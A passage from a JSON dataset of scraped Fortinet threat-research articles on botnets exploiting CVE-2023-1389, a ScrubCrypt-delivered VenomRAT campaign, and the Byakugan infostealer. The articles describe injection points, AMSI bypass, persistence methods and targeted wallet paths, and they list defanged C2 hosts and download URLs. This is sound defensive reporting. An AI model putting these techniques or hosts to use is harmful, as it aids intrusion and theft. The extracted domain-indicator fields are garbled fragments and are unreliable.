          "6259496c7bf20f7b1cca959cd2807538f7e1f735a5bdef487de31c6f7c535645",
          "ba2ceb9b1c6942617e4aaf76f12674acec0f072fde85249ebb7f0255b0681d8a"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.34254143646408836
    }
  },
  {
    "id": "Fortinet_38553",
    "source": "Fortinet",
    "title": "Botnets Continue Exploiting CVE-2023-1389 for Wide-Scale Spread",
    "text": "FortiGuard Labs Threat Research Affected Platforms:TP-Link Archer AX21 (AX1800) Version 1.1.4 Build 20230219 or priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Last year, a command injection vulnerability,CVE-2023-1389, was disclosed and a fix developed for the web management interface of the TP-Link Archer AX21 (AX1800). FortiGuard Labs has developed an IPS signature to tackle this issue. Recently, we observed multiple attacks focusing on this year-old vulnerability, spotlighting botnets like Moobot, Miori, the Golang-based agent “AGoent,” and the Gafgyt Variant. Peaks caused by these threats are evident in the following figure. This article will explore their infection traffic patterns and offer insights into these botnets. This is an unauthenticated command injection vulnerability in the “locale” API available via the web management interface. Users query the specified form “country” and conduct a “write” operation, which is handled by the “set_country” function. It calls the “merge_config_by_country” function and concatenates the argument of the specified form “country” into a command string, which is executed by the “popen” function. Since the “country” field won’t be emptied, the attacker can achieve command injection. AGoent is a Golang-based agent bot. It first fetches the script file ”exec.sh“ from ”hxxp://5[.]10[.]249[.]153,” which retrieves the ELF files of different Linux-based architectures. After downloading the ELF files, the script will attempt to execute each file to find the appropriate architecture and remove each file to erase intrusion traces. The following analysis will focus on the executed file designed for the”386” architecture. There are two primary behaviors. The first is to create the host username and password using random characters. After user creation, the malware establishes a connection with the C&C (command and control) server and passes on the credentials just created by the malware. Gafgyt, also known as BASHLITE, is malware that infects Linux architecture operating systems to launch a DDoS (distributed denial of service) attack. In this variant, the bot downloads the script file “bins.sh” from “hxxp://195[.]62[.]32[.]227” and then executes the script. Gafgyt retrieves Linux architecture execution files with the prefix filename “rebirth.” We will next focus on “rebirth.x86.” Gafgyt gets the compromised target IP and architecture information, which it concatenates into a string that is part of its initial connection message. After establishing a connection with its C&C server, the malware receives a continuous \"PING\" command from the server to ensure persistence on the compromised target. The malware waits for any of the following commands from its C&C server. Each of them stands for a specified attack or function: Moobot fetches a script file from “hxxp://91[.]92[.]253[.]70.” The primary role of “1.sh” is to retrieve an ELF file with different architectures for further infection. The following analysis looks at the execution file designed for the “x86_64” architecture. Once executed, it removes itself and erases all traces from the compromised device. It then displays “0x00000e9” in the console and starts contacting the C2 server “fjsnsinfinsf[.]ngcv[.]top” Based on the XOR key “0xDEADBEEF” used for encoded strings and the hardcoded string “w5q6he3dbrsgmclkiu4to18npavj702f,” we can confirm this malware as Moobot. As the assembly indicates, a DDoS attack can be initiated on remote IPs via a C2 command. Additionally, there is an attack using a variant of Mirai. The exploitation process begins by downloading “tenda.sh” from “hxxp://94[.]156[.]8[.]244.” This script file then downloads an ELF execution file from the same IP address, available in 13 different architectures. The original execution file is compressed using UPX. This Mirai variant displays the message, “faggot got malware'd,” and monitors processes to terminate those associated with packet analysis tools. It then sends packets to the C2 server “45[.]155[.]91[.]135:21425” and awaits additional instructions for attacking. Below is an illustration of a DDoS attack scenario: The command and control (C2) server sends a packet with a length of 0x15, directing the endpoint to initiate an attack. The command specified is 0x01 for a Valve Source Engine (VSE) flood, with a duration of 60 seconds (0x3C), targeting a randomly selected victim's IP address and the port number 30129. Miori, another Mirai variant, shares similar modules. The batch script is fetched from “hxxp://185[.]224[.]128[.]34.” The downloader employs both HTTP and TFTP protocols to retrieve the ELF files. Once executed, Miori displays “your device just got infected to a bootnoot” in the console and sends \\x00\\x00 to the C2 server “rooty[.]cc” on TCP port 33335. The XOR key used for decoding configuration is 0xDFEDDEEF, and a hardcoded password list is included for the brute force attack function. The attacking command packet resembles those seen in previous Mirai variants. Condi’s downloader script was retrieved using multiple protocols to enhance the infection rate. Condi is executed with the parameter “work,” which is included in the first packet sent to the C2 server “bn[.]networkbn[.]click.” The command remains consistent withthe version distributed last year, retaining the function to prevent reboots by deleting binaries responsible for shutting down or rebooting the system. It also scans active processes and cross-references with predefined strings to terminate processes with matching names. Based on its selling page, Condi has updated its attacking methods, as shown below. As usual, botnets relentlessly target IoT vulnerabilities, continuously attempting to exploit them. Despite the discovery and provided remediation for the vulnerability CVE-2023-1389 last year, numerous campaigns still exploit it, resulting in significant peaks in our IPS telemetry. Users should be vigilant against DDoS botnets and promptly apply patches to safeguard their network environments from infection, preventing them from becoming bots for malicious threat actors. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Mirai. AEH!tr.dldrELF/Mirai. A!trELF/Mirai. BSC!trELF/Mirai. CDB!trELF/Mirai. GG!trELF/Mirai. L!trELF/Moobot. A!trLinux/Mirai. BSC!trLinux/Mirai. CEA!trLinux/Mirai. CJS!trLinux/Mirai. F!trLinux/Mirai. IZ1H9!trELF/Mirai. AGIT!trELF/Gafgyt. BJ!trELF/Gafgyt. VE!trELF/Gafgyt. WN!tr.bdrLinux/Gafgyt. ARN!trLinux/Agent. AAO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 servers and downloads URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2023-1389: TP-Link. Archer. AX21. Unauthenticated. Command. Injection We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. fjsnsinfinsf[.]ngcv[.]top45[.]155[.]91[.]135rooty[.]ccbn[.]networkbn[.]click5[.]10[.]249[.]153195[.]62[.]32[.]227 hxxp://91[.]92[.]253[.]70hxxp://94[.]156[.]8[.]244hxxp://103[.]188[.]244[.]189hxxp://185[.]224[.]128[.]34hxxp://5[.]10[.]249[.]153hxxp://195[.]62[.]32[.]227 6104674bfa58ac11c697062d6068c568384f13037d1a146dbe25cd001104ca8bf33a02781d60ca36f4ee56579c6d33846c2549ad7556bca499c73302cee17514d02381634921d92358577c106180eba766b98a520c907870898b2c32d7de45470a3fbc79e742354c8fc82830fc3426f7f8d3b900260c06aa58e53547b48feaa6475487bf7b96fe3da321dac0b5f59231651fc3d71f86bf9580bfa77e59b0f2c8a3e8493f2fb38b7f2ba309809577281d3cc25bee9fb3b5c0053a6e89de1dbce75e6deba076cbe7b9833d0ddee7c8065e91d13f1fc2a5c7daf4db36da458d689a29ef4c5d9172b09d6abc08da800a5a09b460b98aaadf1aa29edda81300fcc609e7af5f1d5d68f75ee03a37ee8016695e35edaae528cdba4ab7b9a90570a1e4beb45906c711ed4f109a10cfaffa0b4c18e56c6f6ddc8d100c87e0a0349a30293de9e8fc16c586f51eb2f86db5a60e54b46d66275fdd6df8fb72e96e50014a1290b731fe97dc723d0d5a51fe8203b33f16a51183b3dab4c9c8ee7bd304462ad1921ffc3c457eb84aa36cd4bc7f3d0dc9a6b8079d63c2bab03c3a646906152876c0d8b4d8950ec1a3f812af69d261f452aae2b19d3bced8551f9178e40ca0c1bcf88562c9ad26ab3ad7d16ac43c9dcbf600d5319e5432d72dc684983cc5f64ff41e092b3a57ee4ecd64591616da6ce0cfb9f01930dbeb179f05e1dbbdbc918098ac092b3a57ee4ecd64591616da6ce0cfb9f01930dbeb179f05e1dbbdbc918098acc65f86d5917025a8674bf9758870decd923ea2662d6611a1365303f4fe55fa2665f64b270a10255db1e55a158a02829a3af982cbcd4b56f14e58132cbb45e6a9a383319a28d50e8c280646dc53a2f33fec62ad69ef4948dae76a4f1f6fe2f1597ef190f05fe9be5d7f38bdb556fffdb7d9b5633ddf60cc43b98c09887a292c497322da39ce05e7496fcaef6602a15266943a59a5027e5ea97344133d42e0f6e3a1c14e99cc8490a4d503ffd660e2d881fa5d766a4288eea328f73bd8ee99078da7d3ffbb3edff1956d7422dd04305d8c3ac16418e2eb190ed9a08a1c275c5e8e1427deedaafd5345aa3c41d39b14b23a454ed894c73f3c9224cd0b51c88afcfaf97c9802324eeb0ebdfc15ce3e390c8cca5a9062c3348f7d2b5b00d1efa495083307e4d1daefca1eeb1ee4a6dea7738594076aa04f3e7e470a8b2ae32b9e489386fe87891311228b58a606114a2d41d94b520c5c4be6ff6bc0add45f5b6250efb9962c3e066904cf8df05f60b9bd21d979466aca64596d2b7557be7fa4358c4da48807aaa7be63c41bbabcf55d40cba416bc23432f247e4038ed0cd32fd055194119530c4dba8a53ba081094ca163f28a51bd37c6ee40b4aa55097939ec1df382be7481bfec8fcbb370afa00e9befa97000e7aa987a17cd6c48fc9f2d0b60110b605570db3158ba355552b5b638e7df4b0888d56d206004d9af6901c4770c75f0dbf4c327df0159305ffc9776ad2fbdd655fe513712f75e360e211aa6686f69aae2d6b41150d61b828368847a0eba51d4562fa2bae4478c10940f5e3e3e46c6b581adb7645ca54dbc3a043ee39a09037a7b5f572c1b8c137cb0c751b26ff9ebd18753e0c31c2100889f0e085ba03eb1c616dcc50606d9733574b68e75be2ee7a123a392cfa9114daeab28976f5ce740da4288d6ac516b5afbf1ea17e28eaada18317c084d08450a220fe7f38ce6b1a767b2e8776f8f4a436b84b912476b00cbc94c9297951a48fcc0f22dac94da599bc2651c757d27cb94c9de16d00ea5af04ffdcfaa03f99233d8aecc17098833d82860d68c12440c5ff7e898b50891cf65bf045b8b9f7bb69e4450d49eb6197722b9b58a8f0e7af479640ea6f666553db4da96c8ec9a54b0fef4bca739b47d943c295c766c7759d0f3a5a891585609019f421a6964f76f573dd50f41ee8dc4c5b29868807af6326faee92ad9ffaeba3dc5a3e220a88f3c07a6ece0adcbeca93fd6024d9f63a971c4aa732ec90930e386b5aa42deb408f0861891e49205fce2496cfe9a6c0cbf86f5d1c48bd88f9120631b1df19d69486f380f7f22482b17eab7343da36229a4e60b9f3938f7846002ff0fa28721dc3617731683a34eb7c8d9a688195d2db1efa8da3084edbe04f76cb0d0477e8061fab5ad856312040a78674932dcd08b6926a8cc8a5de91252c590b4f6ba9100bc0eb0bce4f5f7fc314fa820b4dee00db8d31892ec6fdb4fccca801a40d046d085e7c36ec4ada5f630c47b1ed418ceae077832d6fc2e7730af2715fb954dcc197f92fb6564575d7bd64958bc96be9e0c09d06fa19449a0ad3dc50f09ddb64e94d9808d5c3c414100abb60233614fcbad2e884c2fd851cb9d694186165a4fbfa195bd238473bfead86e74b796c4721d1f5281c284b96ff29d8806a82a6520396b1e21260b374a45ba703239bc29b1345dea89ad9d54db0b7f312aa95c69841a1a8f9ccb66f37f14b5cf2a77e9e8d47400bdec957d9f20729e5c81bfc78be6699d00adf4e8c070d2b955b23054e945c78267beb2ec9cc580130771200e5ea3fdae7846f75c7b65130e73bafda28f442913e403534cb91657c21c2426869f2f25f3558a2cdf5aca294254004954bb10d08a0ef0f913f3ddd1f8f3cc71f114dd12273047ec3eb4e1318c26ec7c10b77e5d631738da126880e248d7f54dfa5718F7faaadceebe69bec33096166a54ed9b593b1b690ba9594b4c353303f55101aae6d1df0621b10d051ebba4507ac3d14f4d206ab56bafbc3510db542d4c4470d94480d72a324f519d3a630bf2ef7b118f4e388c5bccdd0a5465bafd2253daa6194509e84a9abcb732f0ee90bf27dd300247b23b6dac9b41cd01f59d6384b5348a08166a0d2fe65a3ad8b289cb2714c3a150635e29664bff24e5befc6b48526899ed85c3e25bac63b7e232ac3cfd91116bf7c64f1c4c96b933d5715bbe055ffc89f0d62aec4a2a5353a6416bbd403969fc0617d08aeb8eb9e09de4d4068a2fd9f38cfdcaf4611fd855672ad561de196417deea97341f45efd02e97e26d4674291de73bbef9c7fcaf610c858be52a375b517bc62fd7e05dd867f928cd353536de16c192146c8311694342f73a19cfe69ecc53f3f1d6cab006526d2daa5134846357ab5ee18fd3df5a2d7f2d84c75b33fd2f73b76c8e0d2df278d9ded40943d16911ef30bd34f8c11e042e2600c62cf702515c94290207cf72fad1ec0d277221bb700571c16d0f2d0267b354f81fdbfb49738f3cb867371b9ef0d3ffe1020fb9f9cfbf5e6947f6829d17b8a8e5984366efcf5592d8f6bc7ec6d7e85b1872bebcb24a549d3aac3b42f702f29ab27c653c0f239a51601a6aeb50564beda614f8f1f33e botnets,cve FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/botnets-continue-exploiting-cve-2023-1389-for-wide-scale-spread",
      "scraped_at": "2025-07-20T13:48:43.313362",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "ins",
          "xec",
          "enda",
          "r"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2023-1389"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.4878048780487804
    }
  },
  {
    "id": "Fortinet_78877",
    "source": "Fortinet",
    "title": "ScrubCrypt Deploys VenomRAT with an Arsenal of Plugins",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Last year, FortiGuard Labs uncovered the 8220 Gang’s utilization ofScrubCryptto launch attacks targeting exploitable Oracle WebLogic Servers. ScrubCrypt has been described as an “antivirus evasion tool” that converts executables into undetectable batch files. It offers several options to manipulate malware, making it more challenging for antivirus products to detect. We recently discovered a threat actor distributing a phishing email containing malicious Scalable Vector Graphics (SVG) files. The email lures victims into clicking on an attachment, which downloads a ZIP file containing a Batch file obfuscated with the BatCloak tool. ScrubCrypt is then used to load the final payload, VenomRAT while maintaining a connection with a command and control (C2) server to install plugins on victims’ environments. The plugin files downloaded from the C2 server include VenomRAT version 6, Remcos, XWorm, NanoCore, and a stealer designed for specific crypto wallets. This article provides detailed insights into how the threat actor distributes VenomRAT and other plugins. The attacker initiates the attack by sending a phishing email stating that a shipment has been delivered. It also includes an attached invoice. The attachment is an SVG file named “INV0ICE_#TBSBVS0Y3BDSMMX.svg,” which contains embedded base64-encoded data. After victims open the SVG file, the ECMAScript creates a new blob and utilizes “window. URL.createObjectURL” to drop the decoded data as a ZIP file named “INV0ICE_#TBSBVS0Y3BDSMMX.zip.” The decompressed file is an obfuscated batch file that embeds its payload in the section “------BEGIN X509 CRL-----.” Based on the decoded comment in the first line, it is presumed that this batch file was created by the BatCloak tool, known for using heavily obfuscated batch files to deploy various malware families. BatCloak has been employed since 2022 to distribute malware while effectively evading detection by antivirus programs. The script initially copies a PowerShell execution file to “C:\\Users\\Public\\xkn.exe” and utilizes the copied file in later commands. It includes parameters in each command, “-WindowStyle hidden -inputformat none -outputformat none -NonInteractive,” to conceal its activity from the victim’s notice. It then decodes the malicious data and saves it as “pointer.png.” After hex-decoding, the result is saved as a “pointer” and moved to “C:\\Users\\Public\\Libraries\\pointer.cmd.” Upon executing “pointer.cmd,” it employs “cmd /c del” to delete all the files mentioned above. The “pointer.cmd” file serves as the ScrubCrypt batch file. It is deliberately cluttered with numerous junk strings to obscure readability. It incorporates two payloads encoded in Base64 format and employs AES-CBC decryption and GZIP compression to decompress them. It uses the PowerShell command “[System. Reflection. Assembly]::Load” to load the decrypted . NET assembly from a byte array, accessing its entry point method and invoking that method to initiate the execution of the assembly's code. The first payload serves two primary purposes: establishing persistence and loading the targeted malware. It determines whether the current user is part of the built-in Administrator role in a Windows operating system to configure its persistence settings. Additionally, it checks for the presence of any debugger. If found, it terminates the program to avoid detection. If the current user holds Administrator privileges, the program duplicates itself to “%AppData%/strt.cmd” and utilizes a PowerShell command to establish a scheduled task named “OneNote 83701.” This task triggers upon user login, executes “strt.cmd,” and operates with elevated privileges. Conversely, if the user lacks Administrator permissions, the program duplicates itself to the “StartUp” folder under the filename “strt.cmd.” Finally, it loads an assembly from an embedded resource named “P,” which contains a compressed assembly. It then invokes the entry point method of the loaded assembly to execute VenomRAT. The second payload from the ScrubCrypt batch file is for AMSI bypass and ETW bypass. VenomRAT is a remote access Trojan (RAT) first identified in 2020. It is a modified version of the well-known Quasar RAT and is distributed through malicious attachments in spam emails. Cybercriminals utilize it to gain unauthorized access and control over targeted systems. As with other RATs, VenomRAT enables attackers to manipulate compromised devices remotely, allowing them to execute various malicious activities without the victim's knowledge or consent. The fundamental configurations of VenomRAT are Base64-encoded, and AES-CBC encrypted. The decrypted data is shown in Figure 14. After completing environmental checks, VenomRAT initiates communication with its C2 server. The initial packet transmitted contains basic information about the victim, such as hardware specifications, username, operating system details, camera availability, execution path, foreground window name, and the name of the antivirus product installed. All C2 sessions are encrypted using the certificate specified in its configuration. By debugging the program, we extracted and decompressed the packets, revealing the keep-alive sessions established with the C2 server. While VenomRAT's primary program may appear straightforward, it maintains communication channels with the C2 server to acquire additional plugins for various activities. The assembly responsible for parsing packets from the server is outlined below. Upon receiving the “save_Plugin” directive from the server, it can decompress the data and save it to the registry. The “save_Plugin” data comprises a DLL file named “SendFile,” which can parse other “plug_in” files sent from the C2 server. If a plugin file with the same name is already in the victim’s environment, it deletes the existing file and creates a new one with the current data. After decompressing the “plug_in” packet data, it examines the “Filename” to determine which PowerShell command to employ. In Figure 21, once a “plugin” packet is received from the server, VenomRAT reads the registry to fetch the data for “SendFile.dll” and executes the payload contained within the plugin. In the following sections, we’ll elaborate on the plugins provided by the VenomRAT C2 server. The first plugin is embedded in ScrubCrypt and loads without landing any execution file in the victim’s environment, which perfectly hides its trace. The second payload from the ScrubCrypt Batch file is called “ScrubBypass.” This file is highly obfuscated to hide the code flow, functions, and strings. ScrubBypass’s main jobs are patching the AMSI scan buffer and EtwEventWrite to achieve AMSI and ETW bypass. The plugin VenomRAT is version 6.0.3. It has a Keylogger function and stores its C2 server information on the Pastebin website. It collects multiple data types, monitors the victim’s keyboard activities, and persistently sends stolen data to the C2 server. NanoCore is a notorious Remote Access Trojan (RAT) first discovered in 2013. It is known for its ability to remotely access and control a victim's computer, often without their knowledge. It continues to be relevant in the cybercrime world due to its source code being leaked and widely distributed in underground forums. This plugin is distributed to compromised devices by an obfuscated VBS file, shown in Figure 26. The script stores the data for the next stage on the website “hxxps://nanoshield[.]pro/files,” which also serves as a Crypter service provider. Initially, it retrieves a JPG file and decodes the target section using the reversed URL as a parameter. Although accessing the second URL, “hxxps://nanoshd[.]pro/files/new_image.jpg?14441723,” was unsuccessful, modifying the hostname to “nanoshield.pro” allowed us to access to a similar file, as seen in the first URL ”hxxps://nanoshield[.]pro/new_image2.jpg?166154725.” The JPG file employs steganographic methods to conceal code inside the picture, embedding malware data encoded in Base64 between the tags <<BASE64_START>> and <<BASE64_END>>. After decoding the JPG file, we obtained a . NET execution file. This file establishes persistence by configuring the registry key “HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” and checks for any virtual environments. It then downloads encoded data from the “nanoshield.pro/files” URL, reverses the data, replaces the specific string “DgTre,” and employs “RegAsm” to proxy the execution of NanoCore. XWorm is a RAT that spreads through removable drives like USB flash drives, infecting Windows systems. It can steal information or allow remote access. Figure 32 shows the plugin from VenomRAT’s C2 server with the filename “xwrm3.1.vbs” at the end of the packet. In addition to the VBS file, we retrieved another “plug_in” containing a batch script attempting to execute PowerShell commands. It downloads encoded data from “hxxps://kisanbethak[.]com/K/Universallsningen.lpk.” The next stage of the PowerShell code resides at the end of the decoded “Universallsningen.lpk” file. Despite containing numerous junk comments to obfuscate analysis, the PowerShell script uses the Process Hollowing technique to inject shellcode into a legitimate process. Following injection and environment verification, the shellcode executes the final malware, XWorm. In this attack scenario, GuLoader also deploys NanoCore and Remcos. Remcos is a Remote Access Trojan (RAT) first appearing in 2016. It is marketed as legitimate software for remote management but is often used maliciously. Remcos can give attackers complete control over an infected system, allowing them to capture keystrokes, screenshots, credentials, and other sensitive information. It is typically delivered via malicious documents or archive files and has been seen in phishing campaigns. This plugin was distributed from VenomRAT’s C2 using three methods: an obfuscated VBS script named “remcos.vbs”, ScrubCrypt, and Guloader PowerShell. The configuration for Remcos is RC4 encrypted in the“SETTINGS”resource, and the decrypted data is shown in Figure 42. This plugin is not only deployed via the obfuscated VBS script mentioned in the previous section but it is also embedded in a . NET execution file obfuscated using SmartAssembly. The . NET execution file decodes the next stage payload from the Resource file “ach” and writes the data into the memory. It then copies itself to the TEMP folder and sets this copied file to the scheduled task named “Nano.” This task repeats every 10 minutes after the first trigger. The next stage payload is more straightforward. It contains a hardcoded array for the malicious DLL file for stealing the victim’s sensitive data. The DLL file stores its configuration in Base64 encoded data, including the C2 hostname and the certificate to encrypt the communication. This DLL file keeps monitoring the user’s system and aims for specific crypto wallets, Foxmail, and telegram data by performing the following tasks repeatedly: 1. Gathers details about the victim's environment, such as the PC name, username, antivirus software, disk information, and operating system version. 2. Verifies the existence of the following paths: “\"%AppData%\\atomic\\Local Storage\\leveldb” “%AppData%\\Electrum\\wallets,” “%AppData%\\Ethereum\\keystore,” “%AppData%\\Exodus\\exodus.wallet,” “%AppData%\\com.liberty.jaxx\\IndexedDB,” “%AppData%\\Zcash,” “%AppData%\\Foxmail” and “%AppData%\\Telegram Desktop\\Telegram.exe”. 3. Checks if the following registry exists: “Software\\Bitcoin\\Bitcoin-Qt,” “Software\\Dash\\Dash-Qt” and “Software\\Litecoin\\Litecoin-Qt. “ 4. Once collected, the targeted data sends the data appended with the execution file path at the end to the C2 server, “markjohnhvncpure[.]duckdns.org.” This analysis reveals a sophisticated attack leveraging multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. The attackers employ a variety of methods, including phishing emails with malicious attachments, obfuscated script files, and Guloader PowerShell, to infiltrate and compromise victim systems. Furthermore, deploying plugins through different payloads highlights the versatility and adaptability of the attack campaign. The attackers’ ability to persist in the system, evade detection, and execute malicious payloads underscores the importance of robust cybersecurity measures and vigilant monitoring to mitigate such threats effectively. The malware described in this report is detected and blocked byFortiGuard Antivirusas: W32/Rescoms. U!trMSIL/NanoCore. K!trMSIL/Kryptik. TPQ!trMSIL/Kryptik. AKNE!trMSIL/Kryptik. AKCI!trMSIL/Kryptik. AHUA!trMSIL/GenericKD.70765425!trMSIL/GenericKD.61253965!trMSIL/Agent. VIC!trMSIL/Agent. SUB!trMSIL/Agent. PEP!tr.dldrMSIL/Agent. CTE!trMSIL/Agent. CFQ!trJS/Agent. PIJ!trBAT/Agent. B7E9!trBAT/Agent. ARX!tr.dldrVBS/Agent. IFT!trPowerShell/Agent.2C1B!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident ResponseTeam. hjkdnd[.]duckdns[.]orgmup830634[.]duckdns[.]orgmarkjohnhvncpure[.]duckdns[.]orghomoney177[.]duckdns[.]orgfebvenom8[.]duckdns[.]orgrachesxwdavid[.]duckdns[.]org hxxps://nanoshd[.]pro/files/new_image.jpg?14441723hxxps://nanoshield[.]pro/new_image2.jpg?166154725hxxps://kisanbethak[.]com/P/hxxps://kisanbethak[.]com/K/ 06779e1015bd7dd2012ad03f7bb3f34e8d99d6ca41106f89cb9fb1ec46fe034e0b5631041336a58ab859d273d76c571dd372220dfa1583b597a2fe5339ad4bf70f1d6aab547ceca6e71ac2e5a54afdaea597318fe7b6ca337f5b92fdff5961682373840bc455d601551304ec46c281b218e90a91dce3823709c213814636e899258578c03ca314ac3a636a91e8b3245230eae974cf50799d89b3f931e637014c411ad772af94a042413af482a2ef356d3217bcc5123353e3c574347cb93e3d5a4a4b5c22c877437c359ef2acaeeb059881da43b11798581cf2f31c2c83fc34184cda23993d793ef070be7b9066f31a45b10c1e72d809f4a43726da977a0069d851ecf11a64e934409bfada2b6f0c4d89c3420ca95640bc88f928906e6f0b483253a522051e0319176dece493b7e2543135ed41c402adbfeda32a5f6be7d68175546a85e384ced3d4535bad16a877ecd36a79849c379c5daa357689116f042c1b5c5caa3182d6b121c1445d6ca81134ec262cd5ea4f9ef1944f993b63d19876475f1746b4bd8d94d4d3feb1e2d4a829b6c3bab9341e272341f4b3a1da01d207456aaff578555cb82159a9c16a159f0437c39b673744e0c537c4b7f0f67f56c5d96ac5c7284aaa0c195723df7a78ae610a7ee096b3b5bc19f6838451acd438116e71a22bed7ab5a26158fc1cf1b7bb87146254672483aad72736817ff16e656c7b7d7a710e3c0e5da830213f9b72f44a72d721adcf17abc838f28286dde8a1e8d97d9c8d44554ee10310805920afb51249a1e8cd3e32b430e8c9638fec316913d385790dad1a0af5febd7d90e0ec9ce680ec87dcc31a94a25bfb454bb121164bfd8e97019f8c4712f1fc9728c4706112a5ef85a05aa809985709faef951925e09494b2e06e45407f193cfe58e18f5c250bbd1b8e857a754f1c366913129b9dada7bee35a9d30d6f69cd6d173c6a6a93110cac59ab3710e32eced6f266581e88b87cd1364d8c7f6f0246ed91cd294e2e506e7c94ba2f9a33c373c6fcfe04bbe17e7d04bf1a9f6014bf4bcdb3ac4eb6d85bcc4159ae25a7f00c4493cbcb8e892e159d05ad3dc62e1dc45fd31dc2382c1ea5e5f26f4f7692cb2ef8fd1c6e74b69fa16dc2c1694d363d78cdfed0574cf51413b9b48d932e076033bb76cf69a4470b7e9dceea68a037376b323d2a934f9fdc59bfbd2c2c0ed66014bdf059f403f4dc6f2e190d172b7d3c7f1055052f0ed3da5d5979a8a2b622ca2fbcea90774a5bf6008f02c04bc428694a11917375f41ecb7c7aa326cf242b4c56ed1e7b3ae14d5dd68f4164be3d357682754559aa32ea74c284eee64140d3f56a63a225d5de10d051c FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/scrubcrypt-deploys-venomrat-with-arsenal-of-plugins",
      "scraped_at": "2025-07-20T13:48:51.088549",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "kn",
          "uckdns",
          "xodus",
          "endFile",
          "emcos",
          "r",
          "elegram",
          "RL",
          "BSBVS0Y3BDSMMX",
          "niversallsningen",
          "om",
          "trt",
          "anoshield",
          "ointer"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.3313253012048193
    }
  },
  {
    "id": "Fortinet_9902",
    "source": "Fortinet",
    "title": "Byakugan – The Malware Behind a Phishing Attack",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2024, FortiGuard Labs collected a PDF file written in Portuguese that distributes a multi-functional malware known as Byakugan. While investigating this campaign,a reportabout it was published. Therefore, this report will only provide a brief analysis of the overlap between that attack and this and focus primarily on the details of the infostealer. The PDF image shows a blurred table and asks the victim to click the malicious link on the PDF file to see the content. Once the link is clicked, a downloader is downloaded. The downloader drops a copy of itself (require.exe) along with a clean installer to the temp folder. It then downloads a DLL (dynamic link library), which is executed via DLL-hijacking to run require.exe to download the main module (chrome.exe). It executes the downloader's copy (require.exe), not the downloader (Reader_Install_Setup.exe), because when the downloader is named \"require.exe\" and located in the temp folder, its behavior is different from when it is Reader_Install_Setup.exe. The downloader downloads Byakugan’s main module from thinkforce[.]com[.]br. This is the C2 server from which Byakugan receives files and commands. However, it may also work as the attacker's control panel. There is a login page on port 8080. We found descriptions of its features from the page's source code. Byakugan is a node.js-based malware packed into its executable by pkg. In addition to the main script, there are several libraries corresponding to features. Additionally, Byakugan can download extra files to perform its functions. These are stored in the default base path, % APPDATA%ChromeApplication, which is also used to store data created by Byakugan. Byakugan has the following features: In a previous variant (7435f11e41735736ea95e0c8a66e15014ee238c3a746c0f5b3d4faf4d05215af), Byakugan downloaded the software from its domain. But this is not seen in this newer variant. In addition, there are some features that help Byakugan live as long as possible: In addition, it sets the path it uses to the Windows Defender’s exclusion path and allows files in the Windows firewall. There is a growing trend to use both clean and malicious components in malware, and Byakugan is no exception. This approach increases the amount of noise generated during analysis, making accurate detections more difficult. However, the downloaded files provided critical details about how Byakugan works, which helped us analyze the malicious modules. FortiGuard Labs will continue to monitor this malware and provide updates on this variant as they become available. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W64/BKGStealer.854C!trW64/BKGStealer.4C6A!trW64/BKGStealer.47AF!trPDF/TrojanDownloader. Agent. BKN!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet 